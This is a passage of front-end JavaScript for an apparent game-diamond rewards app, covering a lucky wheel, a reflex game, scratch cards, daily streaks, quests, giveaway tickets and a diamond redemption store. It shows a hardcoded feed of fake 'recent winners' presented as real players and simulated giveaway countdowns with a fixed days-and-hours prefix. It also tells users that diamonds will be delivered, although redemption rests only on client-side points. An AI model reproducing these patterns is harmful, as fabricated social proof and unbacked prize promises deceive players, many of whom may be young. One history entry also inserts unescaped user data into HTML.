  const lastSpin = appState.economy.lastSpinTime || 0;
  const remaining = COOLDOWN_MS - (now - lastSpin);

  if (remaining <= 0 || !lastSpin) {
    badge.textContent = "1 Free Spin Ready";
    badge.className = "game-score-badge badge-free-ready";
    btnText.textContent = "Spin Wheel (Free)";
    if (notice)
      notice.textContent = "1 Free spin ready now! Next reset in 4 hours.";
  } else {
    const hours = Math.floor(remaining / (3600 * 1000));
    const mins = Math.floor((remaining % (3600 * 1000)) / (60 * 1000));
    const secs = Math.floor((remaining % (60 * 1000)) / 1000);
    const timeStr = hours > 0 ? `${hours}h ${mins}m` : `${mins}m ${secs}s`;

    badge.textContent = `Next Free: ${timeStr}`;
    badge.className = "game-score-badge";
    btnText.textContent = "Spin Wheel (10 Pts)";
    if (notice)
      notice.textContent = `Free spin resets in ${timeStr} • Or spin now for 10 pts`;
  }
}

function spinTheWheel() {
  if (isSpinning) return;

  const now = Date.now();
  const freeAvailable =
    now - (appState.economy.lastSpinTime || 0) > 4 * 3600 * 1000;

  if (!freeAvailable) {
    if (appState.economy.points < 10) {
      showNoticeModal(
        "Points Required",
        "You need 10 points to spin right now, or wait for the free spin timer.",
        "stars",
        "icon-theme-amber",
      );
      return;
    }
    deductPoints(10);
    showToast("Spun wheel (-10 Points)");
  }

  isSpinning = true;
  appState.economy.lastSpinTime = now;
  saveEconomy();
  updateSpinWheelUI(); // Instantly update button label to "Spin Wheel (10 Pts)" and update badge

  const canvas = document.getElementById("wheelCanvas");
  const selectedIndex = Math.floor(Math.random() * WHEEL_SECTORS.length);
  const prize = WHEEL_SECTORS[selectedIndex];

  // Calculate destination rotation (pointer is at top 270 deg / -90 deg)
  const sectorAngle = 360 / WHEEL_SECTORS.length;
  const targetDeg = 270 - (selectedIndex * sectorAngle + sectorAngle / 2);
  const extraSpins = 360 * 5; // 5 full rotations
  currentWheelAngle +=
    extraSpins + ((targetDeg - (currentWheelAngle % 360) + 360) % 360);

  canvas.style.transform = `rotate(${currentWheelAngle}deg)`;

  setTimeout(() => {
    isSpinning = false;
    updateSpinWheelUI();
    if (prize.type === "points") {
      addPoints(prize.val, `Won on Lucky Spin!`);
      showCelebrationAlert(
        "Winner!",
        `You won +${prize.val} Points from the Lucky Wheel!`,
      );
    } else if (prize.type === "diamonds") {
      appState.economy.diamondsRedeemed += prize.val;
      saveEconomy();
      showCelebrationAlert(
        "JACKPOT!",
        `You won ${prize.val} MLBB Diamonds directly!`,
      );
    } else if (prize.type === "ticket") {
      appState.economy.giveawayTickets += prize.val;
      appState.economy.megaTickets += prize.val;
      saveEconomy();
      updateGiveawayTicketsDisplay();
      showCelebrationAlert("Lucky Ticket!", `You won +1 Free Giveaway Ticket!`);
    }
  }, 3600);
}

// --- GAME 3: DIAMOND RUSH (REFLEX ARCADE) ---
function startRushGame() {
  if (rushState.active) return;
  rushState.active = true;
  rushState.score = 0;
  rushState.timeLeft = 20;

  document.getElementById("rushStartOverlay").classList.add("hidden");
  document.getElementById("rushScore").textContent = "0";
  document.getElementById("rushTimer").textContent = "20s";

  const playground = document.getElementById("rushPlayground");

  // Spawn loop
  rushState.spawnInterval = setInterval(() => {
    if (!rushState.active) return;
    spawnRushItem(playground);
  }, 500);

  // Timer loop
  rushState.timerInterval = setInterval(() => {
    rushState.timeLeft--;
    document.getElementById("rushTimer").textContent = `${rushState.timeLeft}s`;

    if (rushState.timeLeft <= 0) {
      endRushGame();
    }
  }, 1000);
}

function spawnRushItem(container) {
  const item = document.createElement("div");
  const rand = Math.random();
  let type = "diamond";
  let icon = "diamond";
  let points = 10;

  if (rand < 0.2) {
    type = "bomb";
    icon = "bomb";
    points = -15;
  } else if (rand < 0.45) {
    type = "star";
    icon = "stars";
    points = 25;
  }

  item.className = `falling-item item-${type}`;
  item.innerHTML = `<span class="material-symbols-outlined" style="font-size: 22px;">${icon}</span>`;

  const maxX = container.clientWidth - 45;
  const startX = Math.max(5, Math.floor(Math.random() * maxX));
  item.style.left = `${startX}px`;

  item.addEventListener("pointerdown", () => {
    rushState.score = Math.max(0, rushState.score + points);
    document.getElementById("rushScore").textContent = rushState.score;
    item.remove();
  });

  container.appendChild(item);

  setTimeout(() => {
    if (item.parentNode) item.remove();
  }, 2200);
}

function endRushGame() {
  rushState.active = false;
  clearInterval(rushState.spawnInterval);
  clearInterval(rushState.timerInterval);

  const finalPoints = Math.round(rushState.score / 2);
  if (finalPoints > 0) {
    addPoints(finalPoints, "Diamond Rush Score!");
    showCelebrationAlert(
      "Rush Finished!",
      `Awesome speed! You scored ${rushState.score} and earned +${finalPoints} Points!`,
    );
  } else {
    showToast("Rush ended! Try again to score higher.");
  }

  document.getElementById("rushStartOverlay").classList.remove("hidden");
}

// --- GAME 4: SCRATCH CARD ---
function initScratchCard() {
  const canvas = document.getElementById("scratchCanvas");
  if (!canvas) return;
  const ctx = canvas.getContext("2d");

  // Fill metallic silver foil
  ctx.fillStyle = "#cbd5e1";
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  ctx.fillStyle = "#475569";
  ctx.font = "bold 15px sans-serif";
  ctx.textAlign = "center";
  ctx.fillText("SCRATCH TO REVEAL", canvas.width / 2, canvas.height / 2 + 5);

  scratchState.isRevealed = false;
  const prizes = [25, 50, 75, 100, 150];
  scratchState.prizePoints = prizes[Math.floor(Math.random() * prizes.length)];
  document.getElementById("scratchPrizeValue").textContent =
    `+${scratchState.prizePoints} PTS`;

  // Pointer event listeners for scratch effect
  const scratchMove = (e) => {
    if (!scratchState.isDrawing || scratchState.isRevealed) return;
    const rect = canvas.getBoundingClientRect();
    const x = (e.clientX || e.touches?.[0]?.clientX) - rect.left;
    const y = (e.clientY || e.touches?.[0]?.clientY) - rect.top;

    ctx.globalCompositeOperation = "destination-out";
    ctx.beginPath();
    ctx.arc(x, y, 16, 0, Math.PI * 2);
    ctx.fill();

    checkScratchProgress(ctx, canvas);
  };

  canvas.addEventListener("mousedown", () => {
    scratchState.isDrawing = true;
  });
  canvas.addEventListener(
    "touchstart",
    () => {
      scratchState.isDrawing = true;
    },
    { passive: true },
  );

  window.addEventListener("mouseup", () => {
    scratchState.isDrawing = false;
  });
  window.addEventListener("touchend", () => {
    scratchState.isDrawing = false;
  });

  canvas.addEventListener("mousemove", scratchMove);
  canvas.addEventListener("touchmove", scratchMove, { passive: true });
}

function checkScratchProgress(ctx, canvas) {
  if (scratchState.isRevealed) return;

  const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
  let transparentPixels = 0;
  for (let i = 3; i < imgData.data.length; i += 16) {
    if (imgData.data[i] === 0) transparentPixels++;
  }

  const totalSampled = imgData.data.length / 16;
  if (transparentPixels / totalSampled > 0.35) {
    scratchState.isRevealed = true;
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    addPoints(scratchState.prizePoints, "Scratch Card Winner!");
    showCelebrationAlert(
      "Scratch Winner!",
      `Congratulations! You uncovered +${scratchState.prizePoints} Points!`,
    );
  }
}

function resetScratchCard() {
  if (appState.economy.points < 15) {
    showNoticeModal(
      "Points Required",
      "You need 15 points to play a new scratch card. Play the trivia quiz or complete quests to earn points!",
      "stars",
      "icon-theme-amber",
    );
    return;
  }
  deductPoints(15);
  initScratchCard();
  showToast("New Scratch Card ready! (-15 Points)");
}

// --- DAILY CHECK-IN & STREAK MODAL ---
function openCheckInModal() {
  renderStreakCalendar();
  modalCheckIn.classList.remove("hidden");
}

function renderStreakCalendar() {
  streakGrid.innerHTML = "";
  const currentStreak = appState.economy.dailyStreak;
  const todayStr = getTodayDateString();
  const alreadyClaimed = appState.economy.lastCheckInDate === todayStr;

  STREAK_REWARDS.forEach((reward) => {
    const box = document.createElement("div");
    const isPast =
      reward.day < currentStreak ||
      (reward.day === currentStreak && alreadyClaimed);
    const isCurrent = reward.day === currentStreak && !alreadyClaimed;

    box.className = `streak-day-box ${isPast ? "claimed" : ""} ${isCurrent ? "current" : ""}`;
    box.innerHTML = `
      <div class="sday-name">Day ${reward.day}</div>
      <div class="sday-pts">+${reward.points}</div>
      <div style="font-size: 14px; margin-top: 4px;">${isPast ? "✓" : "⭐"}</div>
    `;
    streakGrid.appendChild(box);
  });

  btnClaimDailyCheckInModal.disabled = alreadyClaimed;
  btnClaimDailyCheckInModal.textContent = alreadyClaimed
    ? "Claimed Today"
    : `Claim Day ${currentStreak} Bonus (+${STREAK_REWARDS[currentStreak - 1].points} pts)`;
}

function executeDailyCheckIn() {
  const todayStr = getTodayDateString();
  if (appState.economy.lastCheckInDate === todayStr) {
    showNoticeModal(
      "Bonus Already Claimed",
      "You have already collected today’s streak bonus! Keep your streak active by checking in again tomorrow.",
      "event_available",
      "icon-theme-blue",
    );
    return;
  }

  const currentStreak = appState.economy.dailyStreak;
  const reward = STREAK_REWARDS[currentStreak - 1];

  appState.economy.lastCheckInDate = todayStr;
  addPoints(reward.points, `Day ${currentStreak} Streak Bonus!`);

  // Progress streak for tomorrow
  appState.economy.dailyStreak = currentStreak < 7 ? currentStreak + 1 : 1;
  saveEconomy();

  renderStreakCalendar();
  renderAppScreens();
  showCelebrationAlert(
    "Daily Bonus Claimed!",
    `+${reward.points} Points added to your balance! Keep the streak going tomorrow!`,
  );
}

function getTodayDateString() {
  const d = new Date();
  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}-${String(d.getDate()).padStart(2, "0")}`;
}

// --- DAILY QUESTS MODAL ---
const QUESTS_DEFINITIONS = [
  {
    id: "q_login",
    title: "Daily Check-in",
    desc: "Claim your streak bonus",
    reward: 20,
  },
  {
    id: "q_quiz",
    title: "Answer 1 Hero Quiz",
    desc: "Test your MLBB knowledge",
    reward: 30,
  },
  {
    id: "q_spin",
    title: "Spin the Lucky Wheel",
    desc: "Try your luck on the wheel",
    reward: 25,
  },
  {
    id: "q_rush",
    title: "Play Diamond Rush",
    desc: "Score points in reflex arcade",
    reward: 35,
  },
  {
    id: "q_giveaway",
    title: "Enter Any Giveaway",
    desc: "Buy 1 ticket for diamond raffles",
    reward: 50,
  },
];

function openQuestsModal() {
  questsListContainer.innerHTML = "";
  QUESTS_DEFINITIONS.forEach((quest) => {
    const isClaimed = appState.economy.completedQuests.includes(quest.id);
    const item = document.createElement("div");
    item.className = "quest-item";
    item.innerHTML = `
      <div class="quest-item-left">
        <div class="quest-title">${quest.title}</div>
        <div class="quest-reward">+${quest.reward} Points</div>
      </div>
      <button type="button" class="btn-quest-claim ${isClaimed ? "claimed" : ""}" data-qid="${quest.id}">
        ${isClaimed ? "Claimed ✓" : "Complete"}
      </button>
    `;

    const btn = item.querySelector("button");
    if (!isClaimed) {
      btn.addEventListener("click", () => {
        appState.economy.completedQuests.push(quest.id);
        addPoints(quest.reward, `Quest Completed: ${quest.title}!`);
        saveEconomy();
        openQuestsModal();
      });
    }

    questsListContainer.appendChild(item);
  });

  modalQuests.classList.remove("hidden");
}

// --- DIAMOND GIVEAWAY ENGINE ---
function buyGiveawayTickets(pool, count, cost) {
  if (appState.economy.points < cost) {
    showNoticeModal(
      "Insufficient Points",
      `You need ${cost} points to purchase ${count} ticket(s). Play mini games to earn points!`,
      "confirmation_number",
      "icon-theme-amber",
    );
    return;
  }

  deductPoints(cost);
  appState.economy.giveawayTickets += count;
  if (pool === "mega") {
    appState.economy.megaTickets += count;
  } else {
    appState.economy.dailyTickets += count;
  }
  saveEconomy();
  supabaseInsertGiveawayEntry(pool, count, cost);
  updateGiveawayTicketsDisplay();

  showToast(
    `Purchased ${count} Ticket(s) for the ${pool === "mega" ? "Mega" : "Daily"} Giveaway!`,
  );
}

function updateGiveawayTicketsDisplay() {
  const total = appState.economy.giveawayTickets;
  const mega = appState.economy.megaTickets;
  const daily = appState.economy.dailyTickets;

  if (homeMyTicketsCount) homeMyTicketsCount.textContent = total;
  if (giveawayTotalTickets) giveawayTotalTickets.textContent = total;
  if (megaMyTicketsCount) megaMyTicketsCount.textContent = mega;
  if (dailyMyTicketsCount) dailyMyTicketsCount.textContent = daily;
}

function startGiveawayTimers() {
  setInterval(() => {
    // Dynamic countdown display simulation
    const now = new Date();
    const mins = 59 - now.getMinutes();
    const secs = 59 - now.getSeconds();

    if (megaCountdownText)
      megaCountdownText.textContent = `3d 14h ${mins}m ${secs}s`;
    if (dailyCountdownText)
      dailyCountdownText.textContent = `07h ${mins}m ${secs}s`;

    const elMins = document.getElementById("homeTimerMins");
    const elSecs = document.getElementById("homeTimerSecs");
    if (elMins) elMins.textContent = String(mins).padStart(2, "0");
    if (elSecs) elSecs.textContent = String(secs).padStart(2, "0");

    // Live spin wheel timer tick
    updateSpinWheelUI();
  }, 1000);
}

// --- REDEEM STORE ENGINE ---
function renderStorePackages() {
  storePackagesContainer.innerHTML = "";

  STORE_PACKAGES.forEach((pack) => {
    const card = document.createElement("div");
    card.className = "store-pack-card";
    card.innerHTML = `
      <div class="pack-top">
        <div class="pack-diamond-row">
          <span class="material-symbols-outlined icon-pack-diamond">${pack.icon}</span>
          <span class="pack-amount">${pack.diamonds} 💎</span>
        </div>
        <div class="pack-name">${pack.name}</div>
      </div>
      <div class="pack-bottom">
        <div class="pack-cost">${pack.pointsCost} Pts</div>
        <button type="button" class="btn-redeem-pack" data-pack="${pack.id}">Redeem</button>
      </div>
    `;

    card.querySelector(".btn-redeem-pack").addEventListener("click", () => {
      openRedeemConfirmModal(pack);
    });

    storePackagesContainer.appendChild(card);
  });
}

function openRedeemConfirmModal(pack) {
  pendingRedeemPack = pack;
  const user = appState.user;

  confirmPackDiamonds.textContent = `${pack.diamonds} MLBB Diamonds (${pack.name})`;
  confirmPackPoints.textContent = `Cost: ${pack.pointsCost} Points`;

  if (user?.mlbbFlagUrl) {
    confirmFlagImg.src = user.mlbbFlagUrl;
    confirmFlagImg.classList.remove("hidden");
  } else {
    confirmFlagImg.classList.add("hidden");
  }
  confirmRecipientText.textContent = `${user?.mlbbIgn || user?.username || "Player"} - ID: ${user?.mlbbId} (${user?.mlbbServer})`;

  redeemErrorMsg.classList.add("hidden");
  modalRedeemConfirm.classList.remove("hidden");
}

function executeRedeem() {
  if (!pendingRedeemPack) return;
  const pack = pendingRedeemPack;
  const user = appState.user;

  if (appState.economy.points < pack.pointsCost) {
    redeemErrorMsg.textContent = `Insufficient points! You need ${pack.pointsCost} points, but have ${appState.economy.points}. Play games to earn more!`;
    redeemErrorMsg.classList.remove("hidden");
    return;
  }

  // Deduct points & add to total redeemed
  deductPoints(pack.pointsCost);
  appState.economy.diamondsRedeemed += pack.diamonds;

  // Record Redemption Order
  const orderId = `KTP-${Math.floor(100000 + Math.random() * 900000)}`;
  const newOrder = {
    id: orderId,
    diamonds: pack.diamonds,
    packName: pack.name,
    points: pack.pointsCost,
    targetId: user.mlbbId,
    targetServer: user.mlbbServer,
    targetIgn: user.mlbbIgn || user.username,
    date: new Date().toLocaleDateString(),
    status: "Processing (7-14 Days)",
  };

  appState.economy.redemptions.unshift(newOrder);
  saveEconomy();
  supabaseInsertRedemption(newOrder);

  modalRedeemConfirm.classList.add("hidden");
  renderRedemptionHistory();
  renderAppScreens();

  showCelebrationAlert(
    "Redemption Submitted!",
    `Order #${orderId} confirmed! Your ${pack.diamonds} MLBB Diamonds will be delivered to ${user.mlbbIgn || user.username} (ID: ${user.mlbbId}) within 7-14 working days.`,
  );
}

function renderRedemptionHistory() {
  redemptionHistoryList.innerHTML = "";
  const orders = appState.economy.redemptions || [];

  if (orders.length === 0) {
    emptyHistoryMsg.classList.remove("hidden");
    redemptionHistoryList.appendChild(emptyHistoryMsg);
    return;
  }

  emptyHistoryMsg.classList.add("hidden");

  orders.forEach((order) => {
    const isDelivered = order.status === "Delivered";
    const badgeClass = isDelivered ? "status-delivered" : "status-processing";
    const item = document.createElement("div");
    item.className = "history-item";
    item.innerHTML = `
      <div class="history-item-left">
        <div class="history-icon-box">
          <span class="material-symbols-outlined">diamond</span>
        </div>
        <div>
          <div class="history-item-title">${order.diamonds} Diamonds (${order.id})</div>
          <div class="history-item-sub">Delivering to ${order.targetId} (${order.targetServer}) • ${order.date}</div>
        </div>
      </div>
      <span class="history-status-badge ${badgeClass}">${order.status}</span>
    `;
    redemptionHistoryList.appendChild(item);
  });
}

function showCelebrationAlert(title, msg) {
  rewardModalTitle.textContent = title;
  rewardModalMsg.textContent = msg;
  modalRewardAlert.classList.remove("hidden");
}

function showNoticeModal(
  title,
  message,
  icon = "info",
  iconTheme = "icon-theme-blue",
) {
  const modal = document.getElementById("modalNoticeDialog");
  const titleEl = document.getElementById("noticeDialogTitle");
  const msgEl = document.getElementById("noticeDialogMsg");
  const iconEl = document.getElementById("noticeDialogIcon");
  const wrapEl = document.getElementById("noticeDialogIconWrap");

  if (titleEl) titleEl.textContent = title;
  if (msgEl) msgEl.textContent = message;
  if (iconEl) iconEl.textContent = icon;
  if (wrapEl) wrapEl.className = `dialog-icon-wrap ${iconTheme}`;

  if (modal) modal.classList.remove("hidden");
}

function showConfirmModal({
  title,
  message,
  icon = "help_outline",
  iconTheme = "icon-theme-amber",
  confirmText = "Confirm",
  confirmClass = "btn-primary",
  onConfirm,
}) {
  const modal = document.getElementById("modalConfirmDialog");
  const titleEl = document.getElementById("confirmDialogTitle");
  const msgEl = document.getElementById("confirmDialogMsg");
  const iconEl = document.getElementById("confirmDialogIcon");
  const wrapEl = document.getElementById("confirmDialogIconWrap");
  const confirmBtn = document.getElementById("btnActionConfirmDialog");

  if (titleEl) titleEl.textContent = title;
  if (msgEl) msgEl.textContent = message;
  if (iconEl) iconEl.textContent = icon;
  if (wrapEl) wrapEl.className = `dialog-icon-wrap ${iconTheme}`;
  if (confirmBtn) {
    confirmBtn.textContent = confirmText;
    confirmBtn.className = `btn ${confirmClass} flex-1`;
    confirmBtn.onclick = () => {
      if (modal) modal.classList.add("hidden");
      if (typeof onConfirm === "function") onConfirm();
    };
  }

  if (modal) modal.classList.remove("hidden");
}

// --- REVALIDATE / SYNC MLBB IGN ---
async function refreshMlbbIgn() {
  if (!appState.user || !appState.user.mlbbId || !appState.user.mlbbServer) {
    showToast("No MLBB account linked to sync.");
    return;
  }

  const refreshBtns = [btnHomeRefreshIgn, btnProfileRefreshIgn].filter(Boolean);

  refreshBtns.forEach((btn) => {
    btn.disabled = true;
    btn.classList.add("spinning");
  });

  showToast("Connecting to MLBB servers to sync IGN...");

  try {
    const verified = await verifyMlbbAccountApi(
      appState.user.mlbbId,
      appState.user.mlbbServer,
    );
    const oldIgn = appState.user.mlbbIgn || appState.user.username;

    // Strict IGN update
    appState.user.username = verified.ign;
    appState.user.mlbbIgn = verified.ign;
    appState.user.mlbbRegion = verified.regionName;
    appState.user.mlbbRegionCode = verified.regionCode;
    appState.user.mlbbFlagUrl = verified.flagUrl;
    appState.verifiedAccount = verified;
    saveUser();

    renderAppScreens();

    if (oldIgn && oldIgn !== verified.ign) {
      showToast(`IGN updated to ${verified.ign}!`);
      showCelebrationAlert(
        "IGN Synced!",
        `In-game name updated to "${verified.ign}"! Your Ketupat profile has synced.`,
      );
    } else {
      showToast(`IGN is already up to date: ${verified.ign}`);
    }
  } catch (err) {
    console.error("Failed to sync IGN:", err);
    showToast(err.message || "Unable to revalidate IGN from MLBB servers.");
  } finally {
    refreshBtns.forEach((btn) => {
      btn.disabled = false;
      btn.classList.remove("spinning");
    });
  }
}

// --- DYNAMIC RECENT WINNERS FEED ---
function renderRecentWinners() {
  const container = document.getElementById("recentWinnersList");
  if (!container) return;

  const winners = [];

  // Show user's most recent redemption at top of feed if present
  if (appState.economy.redemptions && appState.economy.redemptions.length > 0) {
    const latest = appState.economy.redemptions[0];
    winners.push({
      ign: latest.targetIgn || appState.user?.username || "You",
      prize: `${latest.diamonds} 💎`,
      time: "Just now",
    });
  }

  // Realistic recent lucky players pool
  const defaultWinners = [
    { ign: "V y n n.", prize: "250 💎", time: "12m ago" },
    { ign: "K a r l T z y", prize: "Weekly Pass", time: "35m ago" },
    { ign: "Moon~Stars", prize: "50 💎", time: "1h ago" },
    { ign: "S O R R Y.", prize: "500 💎", time: "2h ago" },
  ];

  const displayList = [...winners, ...defaultWinners].slice(0, 4);

  container.innerHTML = displayList
    .map(
      (w) => `
    <div class="feed-item">
      <span class="feed-dot"></span>
      <div class="feed-info">
        <span class="feed-user">${escapeHtml(w.ign)}</span>
        <span class="feed-prize">won ${escapeHtml(w.prize)}</span>
      </div>
      <span class="feed-time">${escapeHtml(w.time)}</span>
    </div>
  `,
    )
    .join("");
}

function escapeHtml(str) {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
